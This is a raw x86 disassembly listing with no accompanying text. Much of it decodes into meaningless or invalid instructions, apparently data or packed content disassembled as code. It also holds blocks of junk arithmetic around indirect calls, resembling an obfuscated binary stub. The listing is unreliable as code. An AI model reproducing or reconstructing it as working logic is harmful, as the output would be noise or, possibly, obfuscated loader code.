  402219:	idiv   DWORD PTR [eax-0x3]
  40221c:	pop    edx
  40221d:	inc    edi
  40221e:	xchg   esi,eax
  40221f:	mov    edi,DWORD PTR [ebp+0x2]
  402222:	push   ebp
  402223:	jnp    0x402222
  402225:	cmp    al,0xe7
  402227:	sub    edi,edx
  402229:	test   DWORD PTR [esi-0x748f2f3a],ebp
  40222f:	dec    esi
  402230:	retf   
  402231:	fisubr WORD PTR [eax+0x4d]
  402234:	js     0x4021f5
  402236:	push   ebx
  402237:	xchg   DWORD PTR [edi],ebx
  402239:	cdq    
  40223a:	add    BYTE PTR [ebx+0xca59160],dh
  402240:	aam    0x3c
  402242:	outs   dx,DWORD PTR ds:[esi]
  402243:	mov    ds:0x51924d29,eax
  402248:	dec    edx
  402249:	add    esi,DWORD PTR [edx]
  40224b:	js     0x402238
  40224d:	add    bl,dl
  40224f:	and    DWORD PTR [eax+0x4e],0xffffffcc
  402253:	mov    dh,0xc7
  402255:	mov    bl,0xe1
  402257:	sbb    al,0xb8
  402259:	mov    ebp,0xf2cdabe6
  40225e:	jns    0x4022a6
  402260:	jbe    0x40222f
  402262:	or     eax,ebp
  402264:	adc    edi,DWORD PTR [ecx]
  402266:	sbb    ecx,DWORD PTR [edx+0x3f6bd311]
  40226c:	mov    eax,0xb7b4a555
  402271:	jle    0x402283
  402273:	sbb    al,BYTE PTR [edx]
  402275:	icebp  
  402276:	sbb    DWORD PTR [esi+0x5993a00],esp
  40227c:	retf   0x3cc9
  40227f:	sbb    DWORD PTR [edi-0x7e],0xffffff90
  402283:	imul   ebx,DWORD PTR [ebx+edi*2-0x7e],0x37
  402288:	stos   DWORD PTR es:[edi],eax
  402289:	pop    ecx
  40228a:	mov    es,eax
  40228c:	setae  BYTE PTR [ebx-0x6f]
  402290:	arpl   bp,ax
  402292:	cmc    
  402293:	mov    dl,BYTE PTR [ebx+0x18]
  402296:	inc    esi
  402297:	iret   
  402298:	fstp   TBYTE PTR ds:0xb6e4d844
  40229e:	je     0x402304
  4022a0:	pop    es
  4022a1:	hlt    
  4022a2:	pop    ebp
  4022a3:	std    
  4022a4:	ja     0x4022e1
  4022a6:	inc    edi
  4022a7:	mov    es,WORD PTR [ecx-0x46]
  4022aa:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4022ac:	sbb    al,0xa0
  4022ae:	fimul  DWORD PTR [eax+edi*1]
  4022b1:	jb     0x402318
  4022b3:	xor    al,0x45
  4022b5:	out    dx,al
  4022b6:	iret   
  4022b7:	fmul   QWORD PTR ds:0xf31fccb
  4022bd:	rol    BYTE PTR [ebp+0x52ee82d6],1
  4022c3:	stc    
  4022c4:	into   
  4022c5:	leave  
  4022c6:	mov    BYTE PTR [eax-0x6489fd10],al
  4022cc:	test   eax,0x5f04c6e0
  4022d1:	addr16 out dx,eax
  4022d3:	(bad)  
  4022d4:	call   0xceef:0xda82f526
  4022db:	outs   dx,DWORD PTR ds:[esi]
  4022dc:	(bad)  
  4022dd:	hlt    
  4022de:	inc    edx
  4022df:	out    0xa2,eax
  4022e1:	pop    ds
  4022e2:	push   eax
  4022e3:	fnsave [ebx-0x6bc8e8af]
  4022e9:	jae    0x40233e
  4022eb:	fisub  DWORD PTR [edi+eiz*4-0x19]
  4022ef:	mov    ds:0x5fec9cfe,al
  4022f4:	xchg   ebx,eax
  4022f5:	fwait
  4022f6:	inc    ebp
  4022f7:	leave  
  4022f8:	jmp    0x905c:0x77db28f3
  4022ff:	popa   
  402300:	mov    ch,0xcd
  402302:	add    eax,0x11c5a70
  402307:	xchg   DWORD PTR [eax+0x7e],edi
  40230a:	sti    
  40230b:	test   BYTE PTR [ecx+0xa],ch
  40230e:	cld    
  40230f:	leave  
  402310:	pushf  
  402311:	adc    eax,0xe861405e
  402316:	adc    eax,DWORD PTR [ebp+0x5c81e95]
  40231c:	adc    BYTE PTR [eax+eiz*8-0x794897d5],ah
  402323:	scas   al,BYTE PTR es:[edi]
  402324:	out    dx,al
  402325:	push   eax
  402326:	enter  0x92fb,0xa8
  40232a:	push   edi
  40232b:	repnz xacquire xchg BYTE PTR ds:[esi+0x5e],cl
  402331:	push   edx
  402332:	retf   
  402333:	adc    edi,DWORD PTR [eax+0x1c]
  402336:	mov    al,ds:0xffe1f97e
  40233b:	scas   al,BYTE PTR es:[edi]
  40233c:	xor    eax,0x1d4b0322
  402341:	push   0xffffffbb
  402343:	inc    eax
  402344:	repz ja 0x4023af
  402347:	or     eax,0x768c4aeb
  40234c:	mov    bl,0xe0
  40234e:	out    0x1a,al
  402350:	cli    
  402351:	es adc al,0x54
  402354:	shrd   edi,eax,cl
  402357:	jb     0x40233d
  402359:	loopne 0x40236e
  40235b:	sub    al,0xff
  40235d:	pop    ss
  40235e:	xor    ecx,DWORD PTR [edx]
  402360:	xchg   ebx,eax
  402361:	pop    ebx
  402362:	retf   0xd7c3
  402365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402366:	mov    eax,0xc0740d66
  40236b:	add    DWORD PTR [esi-0x3f],esi
  40236e:	mov    eax,es
  402370:	jle    0x402388
  402372:	popa   
  402373:	push   ebx
  402374:	pop    es
  402375:	rcr    DWORD PTR [edi],cl
  402377:	push   ds
  402378:	ss sbb ecx,edx
  40237b:	jle    0x402341
  40237d:	call   0xc3ecb588
  402382:	xchg   ebx,eax
  402383:	add    bl,BYTE PTR [edi+ebx*1+0x62]
  402387:	push   esi
  402388:	pusha  
  402389:	push   ebx
  40238a:	mov    ah,0x2a
  40238c:	jns    0x4023cc
  40238e:	pusha  
  40238f:	shl    DWORD PTR [ebp-0x269b195b],0xae
  402396:	(bad)
  40239a:	test   BYTE PTR [esi],cl
  40239c:	mul    BYTE PTR [edx-0x1d]
  40239f:	mov    al,0x7f
  4023a1:	adc    cl,dh
  4023a3:	popfw  
  4023a5:	jp     0x402330
  4023a7:	and    dl,BYTE PTR [edi]
  4023a9:	mov    ecx,0x8dc78008
  4023ae:	aas    
  4023af:	jae    0x402369
  4023b1:	mov    esi,0x243b458
  4023b6:	shl    DWORD PTR [edx],cl
  4023b8:	cmp    DWORD PTR [ecx+0x294d117],ebp
  4023be:	mov    ecx,?
  4023c0:	mov    cl,0xa6
  4023c2:	popa   
  4023c3:	inc    esp
  4023c4:	lods   al,BYTE PTR ds:[esi]
  4023c5:	mov    ebx,0xb3d83683
  4023ca:	adc    esi,DWORD PTR [ecx+edi*1-0x1e6ce09c]
  4023d1:	sbb    BYTE PTR fs:[edi],dh
  4023d4:	jns    0x4023c4
  4023d6:	dec    esp
  4023d7:	dec    edx
  4023d8:	sbb    BYTE PTR [ecx],cl
  4023da:	dec    BYTE PTR [edx+0x4bfb1f0f]
  4023e0:	cmp    BYTE PTR [ecx+0x1a84a7b],cl
  4023e6:	in     eax,dx
  4023e7:	in     eax,dx
  4023e8:	shl    BYTE PTR [ebx-0x9bd2284],1
  4023ee:	aad    0x64
  4023f0:	in     eax,dx
  4023f1:	jg     0x40240f
  4023f3:	jmp    0x40238b
  4023f5:	das    
  4023f6:	xchg   ebp,eax
  4023f7:	call   0x68ef:0x6747a034
  4023fe:	cvtps2pi mm0,QWORD PTR [eax]
  402401:	add    BYTE PTR [ecx+0x4283d91d],al
  402407:	add    BYTE PTR [ecx],al
  402409:	test   BYTE PTR [edx+0x0],al
  40240c:	call   0x422220
  402411:	mov    ecx,DWORD PTR [ebp-0x68]
  402414:	mov    edx,DWORD PTR ds:0x4283f9
  40241a:	add    DWORD PTR ds:0x428315,edx
  402420:	mov    edx,DWORD PTR [ebp-0x64]
  402423:	sub    DWORD PTR ds:0x4284e5,ecx
  402429:	xor    eax,ecx
  40242b:	sub    DWORD PTR ds:0x42847d,edi
  402431:	mov    ecx,DWORD PTR [ebp-0x70]
  402434:	mov    edx,DWORD PTR [ebp-0x6c]
  402437:	neg    DWORD PTR ds:0x42851d
  40243d:	sub    eax,ecx
  40243f:	mov    ecx,DWORD PTR ds:0x4226d8
  402445:	lea    eax,[eax+ecx*1-0x27d2]
  40244c:	not    edx
  40244e:	mov    ecx,DWORD PTR [ebp-0x1c]
  402451:	adc    edx,DWORD PTR ds:0x428465
  402457:	mov    edx,DWORD PTR [ebp-0x2c]
  40245a:	neg    DWORD PTR ds:0x4283dd
  402460:	or     ecx,0x4f00
  402466:	and    ecx,edx
  402468:	cmp    DWORD PTR ds:0x4282cd,0x0
  40246f:	mov    DWORD PTR ds:0x4284e9,ebx
  402475:	mov    edx,DWORD PTR ds:0x4283e5
  40247b:	jmp    0x4024db
  402480:	mov    DWORD PTR ds:0x4283c5,0xc4d
  40248a:	cmp    DWORD PTR ds:0x4282cd,0x0
  402491:	jg     0x4024b5
  402497:	push   DWORD PTR [ebp-0x24]
  40249a:	push   DWORD PTR [ebp-0x28]
  40249d:	call   DWORD PTR ds:0x42dfe8
  4024a3:	xor    edx,DWORD PTR ds:0x4283c1
  4024a9:	adc    DWORD PTR ds:0x42848d,ecx
  4024af:	add    edx,0x747e
  4024b5:	or     DWORD PTR ds:0x4284ed,0x36ec
  4024bf:	neg    DWORD PTR ds:0x4284e5
  4024c5:	adc    edx,DWORD PTR ds:0x4282e1
  4024cb:	sbb    DWORD PTR ds:0x428521,edi
  4024d1:	sbb    DWORD PTR ds:0x4284ed,0x669d
  4024db:	mov    edx,DWORD PTR [ebp-0x34]
  4024de:	or     ecx,edx
  4024e0:	xor    ecx,0x5fdd
  4024e6:	cmp    ecx,DWORD PTR [eax]
  4024e8:	mov    DWORD PTR ds:0x428491,0x2fd8
  4024f2:	jne    0x408bb3
  4024f8:	mov    ecx,DWORD PTR [esi]
  4024fa:	cmp    DWORD PTR ds:0x4284a1,0x0
  402501:	mov    DWORD PTR ds:0x4283b5,edi
  402507:	not    edx
  402509:	mov    DWORD PTR ds:0x428491,0x71cc
  402513:	jmp    0x402572
  402518:	mov    eax,ds:0x4284a1
  40251d:	mov    eax,0x2d63
  402522:	cmp    DWORD PTR ds:0x4284a1,0x0
  402529:	je     0x40255f
  40252f:	push   0x428309
  402534:	push   DWORD PTR [ebp-0x18]
  402537:	push   0x4281f5
  40253c:	push   0x6ba7
  402541:	call   DWORD PTR ds:0x42dfec
  402547:	sbb    edx,DWORD PTR ds:0x428315
  40254d:	xor    edx,DWORD PTR ds:0x42830d
  402553:	and    edx,edx
  402555:	mov    DWORD PTR ds:0x4283c9,0x7db9
  40255f:	add    DWORD PTR ds:0x428405,edx
  402565:	inc    edx
  402566:	and    DWORD PTR ds:0x4282d9,ecx
  40256c:	or     DWORD PTR ds:0x428421,ecx
  402572:	mov    eax,DWORD PTR [esi+0x4]
  402575:	shrd   ecx,eax,0x2
  402579:	shr    eax,0x2
  40257c:	adc    DWORD PTR ds:0x428311,ecx
  402582:	mov    eax,DWORD PTR [esi]
  402584:	movzx  edx,BYTE PTR ds:0x4283d1
  40258b:	or     DWORD PTR ds:0x428505,edx
  402591:	mov    edx,DWORD PTR [esi+0x4]
  402594:	shl    eax,0x1e
  402597:	xor    ecx,edi
  402599:	xor    eax,eax
  40259b:	or     eax,ecx
  40259d:	jmp    0x40293e
  4025a2:	cmp    al,0x5
  4025a4:	ja     0x4025d8
  4025a6:	jl     0x40255c
  4025a8:	mov    esp,0xb45d5307
  4025ad:	iret   
  4025ae:	cli    
  4025af:	inc    esp
  4025b0:	sar    DWORD PTR es:[esi-0x42414126],1
  4025b7:	les    edi,FWORD PTR [esi+0x68df66be]
  4025bd:	fstp   TBYTE PTR [eax]
  4025bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025c0:	and    esp,ecx
  4025c2:	cmc    
  4025c3:	pop    esp
  4025c4:	imul   BYTE PTR [ebx+0x565e2ffa]
  4025ca:	pop    esp
  4025cb:	add    dh,BYTE PTR [edx]
  4025cd:	stos   DWORD PTR es:[edi],eax
  4025ce:	jmp    0x4025c5
  4025d0:	or     ecx,DWORD PTR [edx+0x6b]
  4025d3:	enter  0x5b93,0xff
  4025d7:	test   al,0xcd
  4025d9:	cmp    BYTE PTR [edx+esi*2+0x75],ah
  4025dd:	mov    DWORD PTR [esi+0x38],esp
  4025e0:	sar    BYTE PTR [edx+0x62],1
  4025e3:	mov    eax,ds:0x2cd50303
  4025e8:	mov    WORD PTR [edx],gs
  4025ea:	xor    eax,0x8e6a121b
  4025ef:	push   es
  4025f0:	xchg   ebp,eax
  4025f1:	test   eax,0x6b4a9f42
  4025f6:	add    al,0xc2
  4025f8:	imul   ebx,edx,0xffffffd2
  4025fb:	popa   
  4025fc:	adc    al,BYTE PTR [ebx+ebx*4-0x7b]
  402600:	xor    BYTE PTR [edi+0x28],cl
  402603:	add    al,BYTE PTR [ebx]
  402605:	sub    dh,bl
  402607:	and    DWORD PTR [ecx-0x77],0x73
  40260b:	dec    eax
  40260c:	icebp  
  40260d:	aas    
  40260e:	sub    al,0x3f
  402610:	sbb    eax,DWORD PTR [ebx+0x6bea061f]
  402616:	cmp    BYTE PTR [eax+eiz*1],bh
  402619:	in     eax,dx
  40261a:	(bad)  
  40261b:	fmul   QWORD PTR [ebx+0x71]
  40261e:	or     al,0xd9
  402620:	idiv   DWORD PTR [edi+0x48]
  402623:	cmp    BYTE PTR [esp+esi*2-0x5613911f],bl
  40262a:	mov    al,ds:0x5c6dfbac
  40262f:	out    0x90,eax
  402631:	dec    eax
  402632:	out    dx,al
  402633:	test   eax,0x5e5375f3
  402638:	pop    ebp
  402639:	mov    bh,0x6d
  40263b:	mov    esi,0x5cfcceaf
  402640:	and    al,0x62
  402642:	test   DWORD PTR [ebx-0x66],0x8cb23af
  402649:	xlat   BYTE PTR ds:[ebx]
  40264a:	sbb    al,0xe9
  40264c:	int3   
  40264d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40264e:	inc    ecx
  40264f:	enter  0xaffc,0x2
  402653:	imul   esp,ebx,0xe688563b
  402659:	mov    ebp,0xbb7e54dd
  40265e:	fisttp DWORD PTR [ecx+0x0]
  402661:	out    0x6e,al
  402663:	ja     0x402665
  402665:	mov    edi,0x976fb61e
  40266a:	add    al,0x10
  40266c:	test   BYTE PTR [ebx-0x40],ah
  40266f:	sub    eax,0x3920fa5c
  402674:	add    eax,0x9655e6e
  402679:	mov    ds:0xf48e19d6,eax
  40267e:	js     0x402609
  402680:	mov    ch,0x73
  402682:	adc    al,0x6
  402684:	nop
  402685:	frstor [ebp-0x4f]
  402688:	jns    0x402617
  40268a:	in     al,dx
  40268b:	add    al,0xa7
  40268d:	call   0x2adc:0xf297dad9
  402694:	pop    edi
  402695:	mov    edx,0x62aad26
  40269a:	adc    DWORD PTR [ebx],eax
  40269c:	push   0x77111964
  4026a1:	xor    DWORD PTR [esi],esp
  4026a3:	mov    ecx,0x11cea160
  4026a8:	jmp    0xdc1d:0xb55abcd1
  4026af:	add    al,0xf3
  4026b1:	push   ebx
  4026b2:	repz push esi
  4026b4:	ror    DWORD PTR [edx-0x70f1313b],0x3
  4026bb:	push   0x56
  4026bd:	inc    ebp
  4026be:	pusha  
  4026bf:	loope  0x40270b
  4026c1:	mov    edx,0xfb549afe
  4026c6:	mov    eax,0xc1f36b02
  4026cb:	shr    DWORD PTR [ebp+0x5e],1
  4026ce:	int    0x47
  4026d0:	adc    dl,al
  4026d2:	mov    BYTE PTR [eax+0x37377fab],ah
  4026d8:	add    edx,DWORD PTR [ecx+0x3a4cbf6f]
  4026de:	fwait
  4026df:	and    ah,al
  4026e1:	repnz loope 0x4026ba
  4026e4:	mov    dl,0x2f
  4026e6:	aam    0x92
  4026e8:	push   0xffffff82
  4026ea:	clc    
  4026eb:	pop    esp
  4026ec:	mov    ecx,0xa971fb86
  4026f1:	mov    ah,0xbe
  4026f3:	or     cl,BYTE PTR [ebx+0x597bf468]
  4026f9:	jb     0x40269c
  4026fb:	mov    edi,0xe95f063b
  402701:	stc    
  402702:	inc    esi
  402703:	repnz or DWORD PTR [ecx],esp
  402706:	rcr    ebp,1
  402708:	(bad)  
  402709:	dec    edi
  40270a:	in     eax,dx
  40270b:	pop    es
  40270c:	push   eax
  40270d:	lahf   
  40270e:	push   ds
  40270f:	daa    
  402710:	cli    
  402711:	xchg   edi,eax
  402712:	arpl   WORD PTR [esi],ax
  402714:	inc    edx
  402715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402716:	shr    DWORD PTR ds:0x1e8eeb33,1
  40271c:	mov    DWORD PTR [edi],esp
  40271e:	call   0xbec6:0x24eddc49
  402725:	cs jmp 0x402797
  402728:	(bad)  
  402729:	fiadd  WORD PTR [ebp+0x1ed99339]
  40272f:	rol    DWORD PTR [edi],0x47
  402732:	(bad)  
  402733:	loope  0x402751
  402735:	pop    edi
  402736:	inc    ebx
  402737:	in     al,dx
  402738:	mov    esp,0x365bdcf2
  40273d:	xchg   edi,eax
  40273e:	dec    edx
  40273f:	call   eax
  402741:	push   0xa440b08b
  402746:	shr    DWORD PTR [edi+0x1d],cl
  402749:	addr16 popa 
  40274b:	and    al,0x15
  40274d:	cdq    
  40274e:	pop    ebx
  40274f:	scas   eax,DWORD PTR es:[edi]
  402750:	push   esp
  402751:	jmp    0xf5ec3a8a
  402756:	jmp    0x402702
  402758:	jb     0x4027a3
  40275a:	iret   
  40275b:	push   eax
  40275c:	hlt    
  40275d:	lods   eax,DWORD PTR ds:[esi]
  40275e:	push   esi
  40275f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402760:	es icebp 
  402762:	cmp    BYTE PTR [ebx+0x71],ah
  402765:	sbb    bl,BYTE PTR [eax+ebp*1+0x66676192]
  40276c:	scas   eax,DWORD PTR es:[edi]
  40276d:	jnp    0x402777
  40276f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402770:	arpl   sp,bp
  402772:	mov    al,0x56
  402774:	dec    edi
  402775:	push   ds
  402776:	and    eax,0x2a093c72
  40277b:	mov    ebp,0x87bec981
  402780:	outs   dx,BYTE PTR ds:[esi]
  402781:	push   edi
  402782:	and    BYTE PTR [edi+0xaa7baf6],dl
  402788:	add    BYTE PTR [ecx+ebp*1-0x38b85319],0x7b
  402790:	sbb    DWORD PTR [esi-0x7a],0x63cbaadf
  402797:	pop    ebx
  402798:	repnz mov al,ds:0xe9f287db
  40279e:	aaa    
  40279f:	dec    edi
  4027a0:	lock cmp BYTE PTR [ebp-0x32],dh
  4027a4:	mov    cl,0xba
  4027a6:	xchg   DWORD PTR [edx*8-0x420fad3e],ebp
  4027ad:	or     BYTE PTR [edx-0x73],al
  4027b0:	inc    eax
  4027b1:	into   
  4027b2:	pop    ds
  4027b3:	jno    0x402766
  4027b5:	inc    esi
  4027b6:	leave  
  4027b7:	(bad)  
  4027b8:	sbb    BYTE PTR [eax-0x2bd16348],0xec
  4027bf:	and    ecx,DWORD PTR [edi]
  4027c1:	ins    BYTE PTR es:[edi],dx
  4027c2:	pop    eax
  4027c3:	xchg   edx,eax
  4027c4:	fs pop ss
  4027c6:	je     0x4027fb
  4027c8:	popa   
  4027c9:	js     0x4027f1
  4027cb:	add    al,0xa4
  4027cd:	(bad)  
  4027ce:	std    
  4027cf:	or     al,0x10
  4027d1:	in     al,0x1e
  4027d3:	icebp  
  4027d4:	pushf  
  4027d5:	mov    ebp,0x1571796b
  4027da:	sbb    eax,0xfb4eaa92
  4027df:	or     bh,cl
  4027e1:	dec    esp
  4027e2:	stc    
  4027e3:	pop    edi
  4027e4:	imul   edx,DWORD PTR [edx-0x6a0be50b],0xffffffdb
  4027eb:	mov    fs,WORD PTR [bx+di]
  4027ee:	jae    0x4027bb
  4027f0:	setnp  BYTE PTR [edi+edi*1-0xd]
  4027f5:	int3   
  4027f6:	jbe    0x402850
  4027f8:	stc    
  4027f9:	unpckhps xmm0,XMMWORD PTR [ecx]
  4027fc:	stos   DWORD PTR es:[edi],eax
  4027fd:	shl    dh,cl
  4027ff:	mov    bh,0xe6
  402801:	or     ebp,edx
  402803:	sbb    al,0xbb
  402805:	rol    BYTE PTR [eax+0x3f],cl
  402808:	pop    edi
  402809:	pushf  
  40280a:	mov    ebp,0x54521422
  40280f:	dec    ebx
  402810:	cmc    
  402811:	shr    BYTE PTR [eax+0x7d0b2fa1],1
  402817:	sar    DWORD PTR [eax-0x8],0x99
  40281b:	lea    eax,[eax]
  40281d:	arpl   bp,bx
  40281f:	scas   eax,DWORD PTR es:[edi]
  402820:	mov    ss,WORD PTR ds:0x80eb2b6a
  402826:	push   esi
  402827:	or     bh,al
  402829:	sahf   
  40282a:	int3   
  40282b:	clc    
  40282c:	sub    BYTE PTR [ebp-0x36],ah
  40282f:	repnz sub BYTE PTR [edx],bl
  402832:	out    0x59,al
  402834:	(bad)  
  402835:	bnd jmp 0x1cd55d66
  40283b:	and    eax,0xdadea81f
  402840:	test   DWORD PTR [ebp-0x11],eax
  402843:	xlat   BYTE PTR ds:[ebx]
  402844:	mov    DWORD PTR [ecx-0x26066eb9],eax
  40284a:	(bad)  
  40284b:	jmp    0x4028c2
  40284d:	jae    0x402833
  40284f:	jle    0x402861
  402851:	jp     0xe16f6cca
  402857:	jne    0x4028b5
  402859:	jne    0x402852
  40285b:	push   ebx
  40285c:	test   DWORD PTR [ebx-0x53],eax
  40285f:	mov    ebp,0x48d57014
  402864:	xor    DWORD PTR [ecx+ebp*2+0x66c7aebc],esi
  40286b:	or     dh,cl
  40286d:	mov    eax,ds:0x33de4b55
  402872:	add    BYTE PTR [edi-0x49],0x8a
  402876:	adc    BYTE PTR [ecx],bh
  402878:	fs ret 
  40287a:	(bad)  
  40287b:	jb     0x402899
  40287d:	jmp    0x4028b7
  40287f:	loope  0x402812
  402881:	and    BYTE PTR [edi],al
  402883:	(bad)  
  402884:	xchg   ecx,eax
  402885:	mov    ecx,0x96fb82b0
  40288a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40288b:	scas   eax,DWORD PTR es:[edi]
  40288c:	xor    dl,BYTE PTR ds:0x947a27d1
  402892:	and    bl,ch
  402894:	mov    al,ds:0xc43a08d0
  402899:	xchg   esp,eax
  40289a:	call   0xa884:0x5e3bea1b
  4028a1:	sub    eax,0x99c8f0a8
  4028a6:	aaa    
  4028a7:	and    ebx,0xfbafd732
  4028ad:	jp     0x40289f
  4028af:	dec    ecx
  4028b0:	(bad)  
  4028b1:	icebp  
  4028b2:	fidivr DWORD PTR [eax+edi*4+0x45d2ba4e]
  4028b9:	es bt  ecx,ecx
  4028bd:	mov    ds:0xf1f6471c,eax
  4028c2:	lds    edi,FWORD PTR [edi+0x71]
  4028c5:	inc    esp
  4028c6:	dec    ebx
  4028c7:	mov    esp,DWORD PTR [edx]
  4028c9:	jmp    0xfa50:0x2821623e
  4028d0:	jg     0x4028d5
  4028d2:	xlat   BYTE PTR ds:[ebx]
  4028d3:	ss inc ebx
  4028d5:	add    BYTE PTR [edi+edi*8+0x57],ch
  4028d9:	rcr    DWORD PTR [esi+0x738beec2],cl
  4028df:	hlt    
  4028e0:	or     BYTE PTR [edx+0xb6ff4a3],ch
  4028e6:	es push es
  4028e8:	jo     0x402955
  4028ea:	test   eax,0x369ec48d
  4028ef:	leave  
  4028f0:	(bad)  
  4028f1:	or     edi,DWORD PTR [ebp+0x45]
  4028f4:	lds    edi,FWORD PTR [edx]
  4028f6:	(bad)  
  4028f8:	mov    al,0x6
  4028fa:	xor    esi,DWORD PTR [eax-0x45]
  4028fd:	(bad)  
  4028fe:	pop    ecx
  4028ff:	xor    BYTE PTR [ebp-0x5f],0xec
  402903:	xor    al,BYTE PTR [edi]
  402905:	fstp   DWORD PTR [edi]
  402907:	pop    ds
  402908:	push   ds
  402909:	pushf  
  40290a:	repnz mov edx,0x2a7ee752
  402910:	inc    ecx
  402911:	inc    eax
  402912:	mov    ds:0xebf1752a,al
  402917:	std    
  402918:	ins    BYTE PTR es:[edi],dx
  402919:	and    edi,DWORD PTR [bp+di]
  40291c:	and    ch,BYTE PTR [eax-0x37]
  40291f:	sar    dh,0x27
  402922:	out    dx,al
  402923:	data16 mov dl,0xc1
  402926:	xor    DWORD PTR [ebx-0x30],edi
  402929:	pop    ds
  40292a:	jle    0x402934
  40292c:	ds mov cl,0x58
  40292f:	ds mov gs,ebp
  402932:	xor    DWORD PTR [ebx+0x5a],ecx
  402935:	push   ecx
  402936:	fistp  QWORD PTR [edx]
  402938:	or     BYTE PTR [eax-0x15],cl
  40293b:	scas   al,BYTE PTR es:[edi]
  40293c:	pop    ebp
  40293d:	ins    DWORD PTR es:[edi],dx
  40293e:	mov    ecx,DWORD PTR [ebp-0x14]
  402941:	cmp    eax,DWORD PTR [ecx]
  402943:	mov    DWORD PTR ds:0x4283c9,0x7e19
  40294d:	jne    0x402a3a
  402953:	cmp    DWORD PTR ds:0x428491,0x0
  40295a:	mov    DWORD PTR ds:0x4284e5,edi
  402960:	mov    ecx,0x5bac
  402965:	mov    ecx,0x785
  40296a:	jmp    0x4029c0
  40296f:	mov    DWORD PTR ds:0x428495,0x7d3d
  402979:	mov    eax,ds:0x4282f1
  40297e:	cmp    DWORD PTR ds:0x428491,0x0
  402985:	jl     0x4029a6
  40298b:	push   0x25e9
  402990:	call   DWORD PTR ds:0x42e238
  402996:	and    ecx,0x7efc
  40299c:	and    DWORD PTR ds:0x428421,0x428309
  4029a6:	sub    edx,edx
  4029a8:	and    DWORD PTR ds:0x4284f5,0x3b56
  4029b2:	mov    edx,DWORD PTR ds:0x4284cd
  4029b8:	mov    edx,DWORD PTR [edx]
  4029ba:	add    DWORD PTR ds:0x4283e5,edx
  4029c0:	mov    eax,DWORD PTR [ebp-0xc]
  4029c3:	mov    ecx,DWORD PTR [ebp+0x20]
  4029c6:	sub    DWORD PTR ds:0x428315,edi
  4029cc:	xor    DWORD PTR [eax],ecx
  4029ce:	mov    eax,DWORD PTR [ebp-0xc]
  4029d1:	or     edx,ecx
  4029d3:	mov    ecx,DWORD PTR [ebp+0x18]
  4029d6:	or     DWORD PTR ds:0x4283f1,ebx
  4029dc:	mov    edx,DWORD PTR [ebp+0x1c]
  4029df:	add    DWORD PTR ds:0x4282ed,0x2a87
  4029e9:	shrd   ecx,edx,0x2
  4029ed:	sub    DWORD PTR ds:0x4283fd,0x4283d5
  4029f7:	mov    DWORD PTR [ebp-0x14],ecx
  4029fa:	mov    ecx,DWORD PTR [ebp+0x18]
  4029fd:	xor    DWORD PTR [ebp-0x14],edi
  402a00:	shr    edx,0x2
  402a03:	xor    edx,0x4270
  402a09:	mov    edx,DWORD PTR [ebp+0x1c]
  402a0c:	sbb    DWORD PTR ds:0x4283a9,0x4283c5
  402a16:	xor    edx,edx
  402a18:	and    DWORD PTR ds:0x428519,0x4282d1
  402a22:	or     edx,DWORD PTR [ebp-0x14]
  402a25:	or     DWORD PTR ds:0x4283f1,0x6ae7
  402a2f:	shl    ecx,0x1e
  402a32:	xor    DWORD PTR ds:0x428309,edx
  402a38:	sub    DWORD PTR [eax],edx
  402a3a:	xor    ecx,ecx
  402a3c:	add    ecx,DWORD PTR ds:0x428461
  402a42:	mov    eax,ds:0x4284d9
  402a47:	sub    eax,ecx
  402a49:	add    ecx,DWORD PTR [ecx+eax*1]
  402a4c:	mov    eax,ds:0x422520
  402a51:	add    edx,DWORD PTR ds:0x428305
  402a57:	mov    ecx,DWORD PTR [ebp-0xc]
  402a5a:	cmp    DWORD PTR ds:0x4283b9,0x0
  402a61:	not    edx
  402a63:	not    DWORD PTR ds:0x4282ed
  402a69:	movzx  edx,WORD PTR ds:0x4282dd
  402a70:	jmp    0x402ae1
  402a75:	mov    edx,0x6743
  402a7a:	cmp    DWORD PTR ds:0x4283b9,0x0
  402a81:	jg     0x402ac1
  402a87:	push   0x8e71
  402a8c:	push   DWORD PTR [ebp-0x1c]
  402a8f:	call   DWORD PTR ds:0x42dff0
  402a95:	movzx  edx,WORD PTR ds:0x428409
  402a9c:	sbb    edx,DWORD PTR ds:0x428501
  402aa2:	mov    DWORD PTR ds:0x428409,edx
  402aa8:	movzx  edx,BYTE PTR ds:0x428411
  402aaf:	adc    DWORD PTR ds:0x4284e9,edx
  402ab5:	or     edx,0x3af6
  402abb:	and    edx,DWORD PTR ds:0x4282cd
  402ac1:	or     DWORD PTR ds:0x428309,0x67f9
  402acb:	add    edx,0x3b45
  402ad1:	or     edx,DWORD PTR ds:0x428471
  402ad7:	adc    DWORD PTR ds:0x4284e9,0x3eb0
  402ae1:	mov    eax,DWORD PTR [eax]
  402ae3:	cmp    DWORD PTR ds:0x4282f1,0x0
  402aea:	mov    DWORD PTR ds:0x428479,0xab9
  402af4:	mov    edx,DWORD PTR ds:0x42830d
  402afa:	mov    DWORD PTR ds:0x4282e1,0x238f
  402b04:	jmp    0x402b79
  402b09:	mov    DWORD PTR ds:0x428515,ecx
  402b0f:	cmp    DWORD PTR ds:0x4282f1,0x0
  402b16:	ja     0x402b5f
  402b1c:	push   DWORD PTR [ebp-0x14]
  402b1f:	push   0x428131
  402b24:	push   DWORD PTR [ebp-0x10]
  402b27:	push   0x4281d8
  402b2c:	push   DWORD PTR [ebp-0x18]
  402b2f:	push   0x24b6
  402b34:	call   DWORD PTR ds:0x42e23c
  402b3a:	mov    edx,DWORD PTR ds:0x428315
  402b40:	sub    DWORD PTR ds:0x4282fd,edx
  402b46:	sbb    DWORD PTR ds:0x4283e9,ebx
  402b4c:	movzx  edx,BYTE PTR ds:0x4282cd
  402b53:	adc    DWORD PTR ds:0x42840d,edx
  402b59:	add    DWORD PTR ds:0x42850d,ebx
  402b5f:	xor    edx,edx
  402b61:	or     edx,DWORD PTR ds:0x42851d
  402b67:	xor    edx,DWORD PTR ds:0x428485
  402b6d:	mov    DWORD PTR ds:0x42851d,edx
  402b73:	add    edx,0x71a6
  402b79:	add    eax,DWORD PTR [ecx]
  402b7b:	sub    ecx,0x1eef
